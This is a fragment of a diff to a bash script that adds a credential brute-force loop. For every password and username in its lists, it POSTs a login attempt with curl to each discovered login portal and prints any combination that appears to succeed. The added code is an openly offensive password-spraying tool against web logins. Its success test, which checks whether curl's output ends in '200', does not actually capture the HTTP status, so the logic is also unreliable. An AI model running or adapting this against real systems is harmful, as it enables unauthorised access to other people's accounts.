@@ -63,6 +63,38 @@ for LOGIN_URL in "${POSSIBLE_LOGIN_URLS[@]}"; do
 
 		echo ""
 		echo -e "[${green}x${none}] [${green}Unknown${none}] login portal found: [${yellow}${LOGIN_URL}${none}]"
+		echo ""
+		
+		# For each password...
+		counter=0
+		for pass in "${passwords[@]}"; do
+
+		  counter=$((counter+1))
+		  echo -e "Trying ${white}[${none}${yellow}${pass}${none}${white}]${none} (${lightpurple}${counter}${none}/${purple}${passwords_length}${none}) against [${lightpurple}${usernames_length}${none}] usernames..."
+		  echo -e -n " ${orange}[${none}"
+
+		  # For each username...
+		  for user in "${usernames[@]}"; do
+		  
+			echo -e -n "${yellow}=${none}"
+			
+			# Try to login
+			LOGIN_RESPONSE=$(curl -s -d "username=$user&password=$pass" -X POST $LOGIN_URL)
+			
+			# Check if the response code indicates success (200)
+			if [[ $LOGIN_RESPONSE == *"200" ]]; then
+				echo ""
+				echo -e "[${green}Success${none}] Username: [${user}], Password: [${pass}]"
+			else
+				# echo -e "[${red}Failed${none}] Login failed. HTTP response code: [${red}$(echo "$LOGIN_RESPONSE" | grep -o '<title>[^<]*</title>' | sed -e 's/<title>\(.*\)<\/title>/\1/')${none}]"
+				:
+			fi
+
+		  done
+		  
+		  echo -e "${orange}]${none}"
+		  
+		done
 
 	else
 		:
